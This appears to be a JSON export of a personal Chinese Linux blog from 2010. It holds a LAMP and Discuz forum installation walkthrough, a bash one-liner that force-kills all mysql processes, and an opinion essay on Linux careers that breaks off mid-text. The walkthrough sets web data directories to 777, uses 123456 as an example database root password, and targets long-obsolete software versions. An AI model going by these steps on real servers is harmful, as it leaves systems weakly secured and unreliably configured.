/>[root@localhost]# reiserfstune -l /10 /dev/hda10 <br /><br />警告： 请不要在您的Linux的安装分区（也就是Linux系统/ 所在的分区）实践，会导致您的Linux系统崩溃；如果想实践，请在其它分区测试。</p><p> </p><p>破坏的话，用光盘进入查看LABEL，或修复，进入grub修改也可以。</p>"},{"title":"LAMP环境搭建（Red Hat 5）BBS Discuz 7.0","date":"2010-05-14T09:12:00.000Z","_content":"LAMP就是linux+apache（httpd）+mysql+php，完美结合。。<br />实验环境Red Hat 5 .<br /><br />开装。。<br />上面的几个包，光盘里面都有。<br /><br />rpm -ivh 装上就是了。。依赖关系烦人的很，可以在装系统的时候多装一些。。。<br />我就复制一遍文章的装吧，人懒没治。。。嘿<br /><br /><br /><br />一、安装Apache：<br /><br /># tar -zxvf httpd-2.2.10.tar.gz<br /><br />(其实在输入文件名时有个简单的技巧，按tab键补全。)<br /><br /># cd httpd-2.2.10<br /><br />#mkdir /usr/local/apache2&#160;&#160; //建立一个apache2目录，这个目录是apahce的安装位置<br /><br />#./configure --prefix=/usr/local/apache2 --enabel-so&#160; //./configure 这个可以加-h来提供帮助，所有的选项都有解释的。<br /><br />#make;make clean;make install&#160; //这里加个make clean是防止以前有编译过的.<br /><br />#ln /usr/local/apache2/bin/apachectl&#160; /etc/rc.d/init.d/httpd&#160; //添加为httpd“服务”<br /><br />#echo “/usr/local/apache2/bin/apachect start” &gt;&gt;/etc/rc.d/rc.local&#160;&#160; //设置httpd开机自运行<br /><br />二、安装MySQL *<br /><br />#tar -zxvf mysql-5.0.67.tar.gz<br /><br />#cd mysql-5.0.67<br /><br />#groupadd mysql<br /><br />#useradd -g mysql mysql<br /><br />#mkdir /usr/local/mysql<br /><br />#mkdir /usr/local/mysql/data<br /><br />#./configure --prefix=/usr/local/mysql --sysconfdir=/etc --enable-assembler --with-charset=utf8 --with-extra-charsets=all-static--localstaticdir=/usr/local/mysql/data<br /><br />#make clean,make,make install<br /><br />#/usr/local/mysql/bin/mysql_install_db<br /><br /><br />别忘记修改root密码默认是空。<br />#mysqladmin -u root password 123456&#160; //最好设置复杂些。。。<br /><br /><br />三、安装PHP<br /><br />#tar -zxvf php-5.2.6.tar.gz<br /><br />#cd php-5.2.6<br /><br />#mkdir /usr/local/php5<br /><br />./configure&#160;&#160; --prefix=/usr/local/php5&#160;&#160; --with-mysql=/usr&#160;&#160; --with-gd=/usr&#160;&#160; --with-libxml-dir=/usr&#160;&#160; --with-apxs2=/usr/local/apache2/bin/apxs&#160;&#160; --with-zlib=/usr&#160;&#160; --with-jpeg-dir=/usr/local/modules/jpeg&#160;&#160; --with-freetype-dir=/usr&#160;&#160; --with-curl=/usr&#160;&#160; --with-png-dir=/usr&#160;&#160; --enable-sockets&#160;&#160; --with-config-file-path=/usr/local/apache2/conf<br /><br />#make clean<br /><br />#make<br />make install<br /><br />#cp&#160; php.ini-dist /usr/local/apache2/conf/php.ini&#160; //php.ini-dist 文件在原代码所在的目录<br /><br /><br /><br />添加PHP到Apache中<br /><br />#vi&#160; /usr/local/apache2/conf /httpd.conf<br /><br /><br /><br />在httpd.conf文件相应的地方添加下面几行(如果在安装php5时，有的配置可以已经加上了，就不需要再重新添加了)<br /><br /><br /><br />LoadModule php5_module modules/libphp5.so<br /><br />在&lt;IfModule mime_module&gt; 和 &lt;/If&gt;之间<br /><br />大约在“TypesConfig conf/mime.types”之后加上以下几行<br /><br /><br /><br />AddType application/x-httpd-php&#160; .php&#160; //只要有这一行PHP就可运行了<br /><br />AddType application/x-httpd-php&#160; .phtml&#160; .php3<br /><br />AddType application/x-httpd-php-soure&#160; .phps<br /><br />注：前面三行代码中“.php”前面都有一个空格，否则启动apache服务器时会出错<br /><br />在DirectoryIndex index.html index.html.var 后面添加index.php<br /><br />重新启动apache就可以了<br /><br />四、安装Zend<br /><br />#tar -zxvf zendoptimizer-3.3.3-linux-glibc23-i386.tar.gz<br /><br />#cd zendoptimizer-3.3.3-linux-glibc23-1.386<br /><br />#./install.sh<br /><br />安装过程中，需要输入php.ini的位置，和确定Apache的位置。<br /><br />五、ZendOptimizer-3.3.0a-linux-glibc21-i386.tar<br /><br />这个东西实验环境装不装都可以，起到优化作用。可以提到网站的访问速度。提高的还不少、<br />会让你选择php.ini的目录，是目录！默认就好。。<br /><br />六、UCenter_1.5.1_SC_UTF8<br />1. 将 upload 文件夹下所有的文件上传<br /><br />2. 如果您的主机为 *nix 操作系统，请设置如下文件夹权限为 777<br />./data<br />./data/avatar<br />./data/backup<br />./data/cache<br />./data/logs<br />./data/tmp<br />./data/view<br /><br />3. 通过浏览器访问 http://您的域名/UC 安装目录/install/， 根据提示填写 mysql 配置信息、管理员账号信息<br /><br />4.&#160; 删除 install 目录<br /><br />5. 完成安装<br /><br />七、安装 _7.2_SC_UTF8.zip<br /><br />在UCenter向导里面添加这个应用。。<br />解压出来，首先修改配置文件，config.inc.php<br />以下这些目录需要可读写权限 <br />./templates <br />./attachments <br />./forumdata <br />./forumdata/cache <br />./forumdata/templates <br />./forumdata/threadcaches <br />./forumdata/logs <br />执行安装脚本<br />请在浏览器中运行 install 程序，即访问 http://您的域名/论坛目录/install/ <br />参照页面提示，进行安装，直至安装完毕.<br /><br /><br /><br />下课了，最后一句话，，没有网卡的日志真不爽。。<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />","source":"_posts/LAMP环境搭建（Red-Hat-5）BBS-Discuz-7.0.md","raw":"title: LAMP环境搭建（Red Hat 5）BBS Discuz 7.0\ncategories: [Linux]\ntags: []\ndate: 2010-05-14 17:12:00\n---\nLAMP就是linux+apache（httpd）+mysql+php，完美结合。。<br />实验环境Red Hat 5 .<br /><br />开装。。<br />上面的几个包，光盘里面都有。<br /><br />rpm -ivh 装上就是了。。依赖关系烦人的很，可以在装系统的时候多装一些。。。<br />我就复制一遍文章的装吧，人懒没治。。。嘿<br /><br /><br /><br />一、安装Apache：<br /><br /># tar -zxvf httpd-2.2.10.tar.gz<br /><br />(其实在输入文件名时有个简单的技巧，按tab键补全。)<br /><br /># cd httpd-2.2.10<br /><br />#mkdir /usr/local/apache2&#160;&#160; //建立一个apache2目录，这个目录是apahce的安装位置<br /><br />#./configure --prefix=/usr/local/apache2 --enabel-so&#160; //./configure 这个可以加-h来提供帮助，所有的选项都有解释的。<br /><br />#make;make clean;make install&#160; //这里加个make clean是防止以前有编译过的.<br /><br />#ln /usr/local/apache2/bin/apachectl&#160; /etc/rc.d/init.d/httpd&#160; //添加为httpd“服务”<br /><br />#echo “/usr/local/apache2/bin/apachect start” &gt;&gt;/etc/rc.d/rc.local&#160;&#160; //设置httpd开机自运行<br /><br />二、安装MySQL *<br /><br />#tar -zxvf mysql-5.0.67.tar.gz<br /><br />#cd mysql-5.0.67<br /><br />#groupadd mysql<br /><br />#useradd -g mysql mysql<br /><br />#mkdir /usr/local/mysql<br /><br />#mkdir /usr/local/mysql/data<br /><br />#./configure --prefix=/usr/local/mysql --sysconfdir=/etc --enable-assembler --with-charset=utf8 --with-extra-charsets=all-static--localstaticdir=/usr/local/mysql/data<br /><br />#make clean,make,make install<br /><br />#/usr/local/mysql/bin/mysql_install_db<br /><br /><br />别忘记修改root密码默认是空。<br />#mysqladmin -u root password 123456&#160; //最好设置复杂些。。。<br /><br /><br />三、安装PHP<br /><br />#tar -zxvf php-5.2.6.tar.gz<br /><br />#cd php-5.2.6<br /><br />#mkdir /usr/local/php5<br /><br />./configure&#160;&#160; --prefix=/usr/local/php5&#160;&#160; --with-mysql=/usr&#160;&#160; --with-gd=/usr&#160;&#160; --with-libxml-dir=/usr&#160;&#160; --with-apxs2=/usr/local/apache2/bin/apxs&#160;&#160; --with-zlib=/usr&#160;&#160; --with-jpeg-dir=/usr/local/modules/jpeg&#160;&#160; --with-freetype-dir=/usr&#160;&#160; --with-curl=/usr&#160;&#160; --with-png-dir=/usr&#160;&#160; --enable-sockets&#160;&#160; --with-config-file-path=/usr/local/apache2/conf<br /><br />#make clean<br /><br />#make<br />make install<br /><br />#cp&#160; php.ini-dist /usr/local/apache2/conf/php.ini&#160; //php.ini-dist 文件在原代码所在的目录<br /><br /><br /><br />添加PHP到Apache中<br /><br />#vi&#160; /usr/local/apache2/conf /httpd.conf<br /><br /><br /><br />在httpd.conf文件相应的地方添加下面几行(如果在安装php5时，有的配置可以已经加上了，就不需要再重新添加了)<br /><br /><br /><br />LoadModule php5_module modules/libphp5.so<br /><br />在&lt;IfModule mime_module&gt; 和 &lt;/If&gt;之间<br /><br />大约在“TypesConfig conf/mime.types”之后加上以下几行<br /><br /><br /><br />AddType application/x-httpd-php&#160; .php&#160; //只要有这一行PHP就可运行了<br /><br />AddType application/x-httpd-php&#160; .phtml&#160; .php3<br /><br />AddType application/x-httpd-php-soure&#160; .phps<br /><br />注：前面三行代码中“.php”前面都有一个空格，否则启动apache服务器时会出错<br /><br />在DirectoryIndex index.html index.html.var 后面添加index.php<br /><br />重新启动apache就可以了<br /><br />四、安装Zend<br /><br />#tar -zxvf zendoptimizer-3.3.3-linux-glibc23-i386.tar.gz<br /><br />#cd zendoptimizer-3.3.3-linux-glibc23-1.386<br /><br />#./install.sh<br /><br />安装过程中，需要输入php.ini的位置，和确定Apache的位置。<br /><br />五、ZendOptimizer-3.3.0a-linux-glibc21-i386.tar<br /><br />这个东西实验环境装不装都可以，起到优化作用。可以提到网站的访问速度。提高的还不少、<br />会让你选择php.ini的目录，是目录！默认就好。。<br /><br />六、UCenter_1.5.1_SC_UTF8<br />1. 将 upload 文件夹下所有的文件上传<br /><br />2. 如果您的主机为 *nix 操作系统，请设置如下文件夹权限为 777<br />./data<br />./data/avatar<br />./data/backup<br />./data/cache<br />./data/logs<br />./data/tmp<br />./data/view<br /><br />3. 通过浏览器访问 http://您的域名/UC 安装目录/install/， 根据提示填写 mysql 配置信息、管理员账号信息<br /><br />4.&#160; 删除 install 目录<br /><br />5. 完成安装<br /><br />七、安装 _7.2_SC_UTF8.zip<br /><br />在UCenter向导里面添加这个应用。。<br />解压出来，首先修改配置文件，config.inc.php<br />以下这些目录需要可读写权限 <br />./templates <br />./attachments <br />./forumdata <br />./forumdata/cache <br />./forumdata/templates <br />./forumdata/threadcaches <br />./forumdata/logs <br />执行安装脚本<br />请在浏览器中运行 install 程序，即访问 http://您的域名/论坛目录/install/ <br />参照页面提示，进行安装，直至安装完毕.<br /><br /><br /><br />下课了，最后一句话，，没有网卡的日志真不爽。。<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />","slug":"LAMP环境搭建（Red-Hat-5）BBS-Discuz-7.0","published":1,"updated":"2023-04-22T05:38:44.646Z","_id":"clgrjlxdy002l7opi3pmgat52","comments":1,"layout":"post","photos":[],"link":"","content":"<p>LAMP就是linux+apache（httpd）+mysql+php，完美结合。。<br />实验环境Red Hat 5 .<br /><br />开装。。<br />上面的几个包，光盘里面都有。<br /><br />rpm -ivh 装上就是了。。依赖关系烦人的很，可以在装系统的时候多装一些。。。<br />我就复制一遍文章的装吧，人懒没治。。。嘿<br /><br /><br /><br />一、安装Apache：<br /><br /># tar -zxvf httpd-2.2.10.tar.gz<br /><br />(其实在输入文件名时有个简单的技巧，按tab键补全。)<br /><br /># cd httpd-2.2.10<br /><br />#mkdir &#x2F;usr&#x2F;local&#x2F;apache2&amp;#160;&amp;#160; &#x2F;&#x2F;建立一个apache2目录，这个目录是apahce的安装位置<br /><br />#.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;apache2 –enabel-so&amp;#160; &#x2F;&#x2F;.&#x2F;configure 这个可以加-h来提供帮助，所有的选项都有解释的。<br /><br />#make;make clean;make install&amp;#160; &#x2F;&#x2F;这里加个make clean是防止以前有编译过的.<br /><br />#ln &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;bin&#x2F;apachectl&amp;#160; &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;httpd&amp;#160; &#x2F;&#x2F;添加为httpd“服务”<br /><br />#echo “&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;bin&#x2F;apachect start” &gt;&gt;&#x2F;etc&#x2F;rc.d&#x2F;rc.local&amp;#160;&amp;#160; &#x2F;&#x2F;设置httpd开机自运行<br /><br />二、安装MySQL *<br /><br />#tar -zxvf mysql-5.0.67.tar.gz<br /><br />#cd mysql-5.0.67<br /><br />#groupadd mysql<br /><br />#useradd -g mysql mysql<br /><br />#mkdir &#x2F;usr&#x2F;local&#x2F;mysql<br /><br />#mkdir &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data<br /><br />#.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql –sysconfdir&#x3D;&#x2F;etc –enable-assembler –with-charset&#x3D;utf8 –with-extra-charsets&#x3D;all-static–localstaticdir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data<br /><br />#make clean,make,make install<br /><br />#&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#x2F;mysql_install_db<br /><br /><br />别忘记修改root密码默认是空。<br />#mysqladmin -u root password 123456&amp;#160; &#x2F;&#x2F;最好设置复杂些。。。<br /><br /><br />三、安装PHP<br /><br />#tar -zxvf php-5.2.6.tar.gz<br /><br />#cd php-5.2.6<br /><br />#mkdir &#x2F;usr&#x2F;local&#x2F;php5<br /><br />.&#x2F;configure&amp;#160;&amp;#160; –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php5&amp;#160;&amp;#160; –with-mysql&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-gd&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-libxml-dir&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-apxs2&#x3D;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;bin&#x2F;apxs&amp;#160;&amp;#160; –with-zlib&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-jpeg-dir&#x3D;&#x2F;usr&#x2F;local&#x2F;modules&#x2F;jpeg&amp;#160;&amp;#160; –with-freetype-dir&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-curl&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-png-dir&#x3D;&#x2F;usr&amp;#160;&amp;#160; –enable-sockets&amp;#160;&amp;#160; –with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf<br /><br />#make clean<br /><br />#make<br />make install<br /><br />#cp&amp;#160; php.ini-dist &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;php.ini&amp;#160; &#x2F;&#x2F;php.ini-dist 文件在原代码所在的目录<br /><br /><br /><br />添加PHP到Apache中<br /><br />#vi&amp;#160; &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf &#x2F;httpd.conf<br /><br /><br /><br />在httpd.conf文件相应的地方添加下面几行(如果在安装php5时，有的配置可以已经加上了，就不需要再重新添加了)<br /><br /><br /><br />LoadModule php5_module modules&#x2F;libphp5.so<br /><br />在&lt;IfModule mime_module&gt; 和 &lt;&#x2F;If&gt;之间<br /><br />大约在“TypesConfig conf&#x2F;mime.types”之后加上以下几行<br /><br /><br /><br />AddType application&#x2F;x-httpd-php&amp;#160; .php&amp;#160; &#x2F;&#x2F;只要有这一行PHP就可运行了<br /><br />AddType application&#x2F;x-httpd-php&amp;#160; .phtml&amp;#160; .php3<br /><br />AddType application&#x2F;x-httpd-php-soure&amp;#160; .phps<br /><br />注：前面三行代码中“.php”前面都有一个空格，否则启动apache服务器时会出错<br /><br />在DirectoryIndex index.html index.html.var 后面添加index.php<br /><br />重新启动apache就可以了<br /><br />四、安装Zend<br /><br />#tar -zxvf zendoptimizer-3.3.3-linux-glibc23-i386.tar.gz<br /><br />#cd zendoptimizer-3.3.3-linux-glibc23-1.386<br /><br />#.&#x2F;install.sh<br /><br />安装过程中，需要输入php.ini的位置，和确定Apache的位置。<br /><br />五、ZendOptimizer-3.3.0a-linux-glibc21-i386.tar<br /><br />这个东西实验环境装不装都可以，起到优化作用。可以提到网站的访问速度。提高的还不少、<br />会让你选择php.ini的目录，是目录！默认就好。。<br /><br />六、UCenter_1.5.1_SC_UTF8<br />1. 将 upload 文件夹下所有的文件上传<br /><br />2. 如果您的主机为 *nix 操作系统，请设置如下文件夹权限为 777<br />.&#x2F;data<br />.&#x2F;data&#x2F;avatar<br />.&#x2F;data&#x2F;backup<br />.&#x2F;data&#x2F;cache<br />.&#x2F;data&#x2F;logs<br />.&#x2F;data&#x2F;tmp<br />.&#x2F;data&#x2F;view<br /><br />3. 通过浏览器访问 http:&#x2F;&#x2F;您的域名&#x2F;UC 安装目录&#x2F;install&#x2F;， 根据提示填写 mysql 配置信息、管理员账号信息<br /><br />4.&amp;#160; 删除 install 目录<br /><br />5. 完成安装<br /><br />七、安装 _7.2_SC_UTF8.zip<br /><br />在UCenter向导里面添加这个应用。。<br />解压出来，首先修改配置文件，config.inc.php<br />以下这些目录需要可读写权限 <br />.&#x2F;templates <br />.&#x2F;attachments <br />.&#x2F;forumdata <br />.&#x2F;forumdata&#x2F;cache <br />.&#x2F;forumdata&#x2F;templates <br />.&#x2F;forumdata&#x2F;threadcaches <br />.&#x2F;forumdata&#x2F;logs <br />执行安装脚本<br />请在浏览器中运行 install 程序，即访问 http:&#x2F;&#x2F;您的域名&#x2F;论坛目录&#x2F;install&#x2F; <br />参照页面提示，进行安装，直至安装完毕.<br /><br /><br /><br />下课了，最后一句话，，没有网卡的日志真不爽。。<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>LAMP就是linux+apache（httpd）+mysql+php，完美结合。。<br />实验环境Red Hat 5 .<br /><br />开装。。<br />上面的几个包，光盘里面都有。<br /><br />rpm -ivh 装上就是了。。依赖关系烦人的很，可以在装系统的时候多装一些。。。<br />我就复制一遍文章的装吧，人懒没治。。。嘿<br /><br /><br /><br />一、安装Apache：<br /><br /># tar -zxvf httpd-2.2.10.tar.gz<br /><br />(其实在输入文件名时有个简单的技巧，按tab键补全。)<br /><br /># cd httpd-2.2.10<br /><br />#mkdir &#x2F;usr&#x2F;local&#x2F;apache2&amp;#160;&amp;#160; &#x2F;&#x2F;建立一个apache2目录，这个目录是apahce的安装位置<br /><br />#.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;apache2 –enabel-so&amp;#160; &#x2F;&#x2F;.&#x2F;configure 这个可以加-h来提供帮助，所有的选项都有解释的。<br /><br />#make;make clean;make install&amp;#160; &#x2F;&#x2F;这里加个make clean是防止以前有编译过的.<br /><br />#ln &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;bin&#x2F;apachectl&amp;#160; &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;httpd&amp;#160; &#x2F;&#x2F;添加为httpd“服务”<br /><br />#echo “&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;bin&#x2F;apachect start” &gt;&gt;&#x2F;etc&#x2F;rc.d&#x2F;rc.local&amp;#160;&amp;#160; &#x2F;&#x2F;设置httpd开机自运行<br /><br />二、安装MySQL *<br /><br />#tar -zxvf mysql-5.0.67.tar.gz<br /><br />#cd mysql-5.0.67<br /><br />#groupadd mysql<br /><br />#useradd -g mysql mysql<br /><br />#mkdir &#x2F;usr&#x2F;local&#x2F;mysql<br /><br />#mkdir &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data<br /><br />#.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql –sysconfdir&#x3D;&#x2F;etc –enable-assembler –with-charset&#x3D;utf8 –with-extra-charsets&#x3D;all-static–localstaticdir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data<br /><br />#make clean,make,make install<br /><br />#&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#x2F;mysql_install_db<br /><br /><br />别忘记修改root密码默认是空。<br />#mysqladmin -u root password 123456&amp;#160; &#x2F;&#x2F;最好设置复杂些。。。<br /><br /><br />三、安装PHP<br /><br />#tar -zxvf php-5.2.6.tar.gz<br /><br />#cd php-5.2.6<br /><br />#mkdir &#x2F;usr&#x2F;local&#x2F;php5<br /><br />.&#x2F;configure&amp;#160;&amp;#160; –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php5&amp;#160;&amp;#160; –with-mysql&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-gd&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-libxml-dir&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-apxs2&#x3D;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;bin&#x2F;apxs&amp;#160;&amp;#160; –with-zlib&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-jpeg-dir&#x3D;&#x2F;usr&#x2F;local&#x2F;modules&#x2F;jpeg&amp;#160;&amp;#160; –with-freetype-dir&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-curl&#x3D;&#x2F;usr&amp;#160;&amp;#160; –with-png-dir&#x3D;&#x2F;usr&amp;#160;&amp;#160; –enable-sockets&amp;#160;&amp;#160; –with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf<br /><br />#make clean<br /><br />#make<br />make install<br /><br />#cp&amp;#160; php.ini-dist &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;php.ini&amp;#160; &#x2F;&#x2F;php.ini-dist 文件在原代码所在的目录<br /><br /><br /><br />添加PHP到Apache中<br /><br />#vi&amp;#160; &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf &#x2F;httpd.conf<br /><br /><br /><br />在httpd.conf文件相应的地方添加下面几行(如果在安装php5时，有的配置可以已经加上了，就不需要再重新添加了)<br /><br /><br /><br />LoadModule php5_module modules&#x2F;libphp5.so<br /><br />在&lt;IfModule mime_module&gt; 和 &lt;&#x2F;If&gt;之间<br /><br />大约在“TypesConfig conf&#x2F;mime.types”之后加上以下几行<br /><br /><br /><br />AddType application&#x2F;x-httpd-php&amp;#160; .php&amp;#160; &#x2F;&#x2F;只要有这一行PHP就可运行了<br /><br />AddType application&#x2F;x-httpd-php&amp;#160; .phtml&amp;#160; .php3<br /><br />AddType application&#x2F;x-httpd-php-soure&amp;#160; .phps<br /><br />注：前面三行代码中“.php”前面都有一个空格，否则启动apache服务器时会出错<br /><br />在DirectoryIndex index.html index.html.var 后面添加index.php<br /><br />重新启动apache就可以了<br /><br />四、安装Zend<br /><br />#tar -zxvf zendoptimizer-3.3.3-linux-glibc23-i386.tar.gz<br /><br />#cd zendoptimizer-3.3.3-linux-glibc23-1.386<br /><br />#.&#x2F;install.sh<br /><br />安装过程中，需要输入php.ini的位置，和确定Apache的位置。<br /><br />五、ZendOptimizer-3.3.0a-linux-glibc21-i386.tar<br /><br />这个东西实验环境装不装都可以，起到优化作用。可以提到网站的访问速度。提高的还不少、<br />会让你选择php.ini的目录，是目录！默认就好。。<br /><br />六、UCenter_1.5.1_SC_UTF8<br />1. 将 upload 文件夹下所有的文件上传<br /><br />2. 如果您的主机为 *nix 操作系统，请设置如下文件夹权限为 777<br />.&#x2F;data<br />.&#x2F;data&#x2F;avatar<br />.&#x2F;data&#x2F;backup<br />.&#x2F;data&#x2F;cache<br />.&#x2F;data&#x2F;logs<br />.&#x2F;data&#x2F;tmp<br />.&#x2F;data&#x2F;view<br /><br />3. 通过浏览器访问 http:&#x2F;&#x2F;您的域名&#x2F;UC 安装目录&#x2F;install&#x2F;， 根据提示填写 mysql 配置信息、管理员账号信息<br /><br />4.&amp;#160; 删除 install 目录<br /><br />5. 完成安装<br /><br />七、安装 _7.2_SC_UTF8.zip<br /><br />在UCenter向导里面添加这个应用。。<br />解压出来，首先修改配置文件，config.inc.php<br />以下这些目录需要可读写权限 <br />.&#x2F;templates <br />.&#x2F;attachments <br />.&#x2F;forumdata <br />.&#x2F;forumdata&#x2F;cache <br />.&#x2F;forumdata&#x2F;templates <br />.&#x2F;forumdata&#x2F;threadcaches <br />.&#x2F;forumdata&#x2F;logs <br />执行安装脚本<br />请在浏览器中运行 install 程序，即访问 http:&#x2F;&#x2F;您的域名&#x2F;论坛目录&#x2F;install&#x2F; <br />参照页面提示，进行安装，直至安装完毕.<br /><br /><br /><br />下课了，最后一句话，，没有网卡的日志真不爽。。<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></p>\n"},{"title":"linux bash记录","date":"2010-09-02T07:18:00.000Z","_content":"kill -9 $(ps aux | grep mysql | grep -v grep | awk '{print $2}')<br /><br />杀掉所有包含mysql的进程。<br />kill 删进程<br />ps aux 列出进程<br />grep 筛选 -v 排除<br />awk 提取，第二空格隔开的文字<br /><br />","source":"_posts/linux-bash记录.md","raw":"title: linux bash记录\ncategories: [Shell编程]\ntags: []\ndate: 2010-09-02 15:18:00\n---\nkill -9 $(ps aux | grep mysql | grep -v grep | awk '{print $2}')<br /><br />杀掉所有包含mysql的进程。<br />kill 删进程<br />ps aux 列出进程<br />grep 筛选 -v 排除<br />awk 提取，第二空格隔开的文字<br /><br />","slug":"linux-bash记录","published":1,"updated":"2023-04-22T05:38:44.778Z","_id":"clgrjlxe0002o7opi9n9catm8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>kill -9 $(ps aux | grep mysql | grep -v grep | awk ‘{print $2}’)<br /><br />杀掉所有包含mysql的进程。<br />kill 删进程<br />ps aux 列出进程<br />grep 筛选 -v 排除<br />awk 提取，第二空格隔开的文字<br /><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>kill -9 $(ps aux | grep mysql | grep -v grep | awk ‘{print $2}’)<br /><br />杀掉所有包含mysql的进程。<br />kill 删进程<br />ps aux 列出进程<br />grep 筛选 -v 排除<br />awk 提取，第二空格隔开的文字<br /><br /></p>\n"},{"title":"LAMP自己的另一种见解","date":"2010-07-19T13:45:00.000Z","_content":"LAMP环境=linux+Apache+mysql+php 多么完美的搭档。<br />慢慢的发现，这个组合环境是多么的简单，多么的没有技术。<br />在公司工作两个星期，所见、所想和大家分享一下。<br />下面是自己的一些片面的见解。正好也组成了LAMP，也和原始的LAMP深一步的理解。欢迎大家拍砖哈。<br /><br />L=linux。这里是我认为只叫linux，不合适，范围太大、太广、太深了。当前电子产品发展速度这么快。做嵌入式开发已经是一个趋势了。编译linux内核，自己裁剪系统是做系统的根本。这又离不开速度快、安全性高、开源的linux。可见linux内核系统是多么的重要。<br /><br />A这里不是Apache了，而是泛指源代码，也就是说自己有写代码和编译代码的能力。也就是linux开发。如果你会编译内核，看懂内核代码，那这里的写代码的能力，应该就不用说了。<br /><br />M这里也不是Mysql数据库，而是泛指数据库。现在只要是一个储存型或交互性软件（也许可以这样说），都离不开数据库。应该有设计和建设数据库的能力。去公司，别人都会问会安装数据库吗？笑话，安装谁不会，没有技术的。。也赚不到大钱的。。<br /><br />P=web编程语言。php语言在web编程中，是速度最快的一个。不知道安全性，算不算厉害。不管是什么语言，你至少会一种web编程语言。也就是说必须具备web编程能力。。<br /><br />如果你具备我说这几种能力，我相信找工作，真是九牛一毛的问题。组建团队，自己开公司也是没有问题的。<br /><br />越来越发现自己越来越渺小、自己越来越垃圾、越来越令自己厌烦。<br />学习的时候，总是感觉差不多了，现在可见，学的一塌糊涂啊、什么都不会啊 。呜呜、<br />自己会慢慢努力的，期望越大失望越大呗。但是自己从来没有放弃过。因为我没有资本，没有资本是最大的资本。嘿嘿，理由找不不错。<br />就写到这把，想多。<br />最后，希望自己和自己的朋友、同学。都能够在linux上大展身手。以为公司里会linux的人太少了。linux才是咱们的资本、自学更是资本。<br /><br />转载请注明：http://hi.baidu.com/key1088。","source":"_posts/LAMP自己的另一种见解.md","raw":"title: LAMP自己的另一种见解\ncategories: [Linux]\ntags: []\ndate: 2010-07-19 21:45:00\n---\nLAMP环境=linux+Apache+mysql+php 多么完美的搭档。<br />慢慢的发现，这个组合环境是多么的简单，多么的没有技术。<br />在公司工作两个星期，所见、所想和大家分享一下。<br />下面是自己的一些片面的见解。正好也组成了LAMP，也和原始的LAMP深一步的理解。欢迎大家拍砖哈。<br /><br />L=linux。这里是我认为只叫linux，不合适，范围太大、太广、太深了。当前电子产品发展速度这么快。做嵌入式开发已经是一个趋势了。编译linux内核，自己裁剪系统是做系统的根本。这又离不开速度快、安全性高、开源的linux。可见linux内核系统是多么的重要。<br /><br />A这里不是Apache了，而是泛指源代码，也就是说自己有写代码和编译代码的能力。也就是linux开发。如果你会编译内核，看懂内核代码，那这里的写代码的能力，应该就不用说了。<br /><br />M这里也不是Mysql数据库，而是泛指数据库。现在只要是一个储存型或交互性软件（也许可以这样说），都离不开数据库。应该有设计和建设数据库的能力。去公司，别人都会问会安装数据库吗？笑话，安装谁不会，没有技术的。。也赚不到大钱的。。<br /><br />P=web编程语言。php语言在web编程中，是速度最快的一个。不知道安全性，算不算厉害。不管是什么语言，你至少会一种web编程语言。也就是说必须具备web编程能力。。<br /><br />如果你具备我说这几种能力，我相信找工作，真是九牛一毛的问题。组建团队，自己开公司也是没有问题的。<br /><br />越来越发现自己越来越渺小、自己越来越垃圾、越来越令自己厌烦。<br />学习的时候，总是感觉差不多了，现在可见，学的一塌糊涂啊、什么都不会啊 。呜呜、<br />自己会慢慢努力的，期望越大失望越大呗。但是自己从来没有放弃过。因为我没有资本，没有资本是最大的资本。嘿嘿，理由找不不错。<br />就写到这把，想多。<br />最后，希望自己和自己的朋友、同学。都能够在linux上大展身手。以为公司里会linux的人太少了。linux才是咱们的资本、自学更是资本。<br /><br 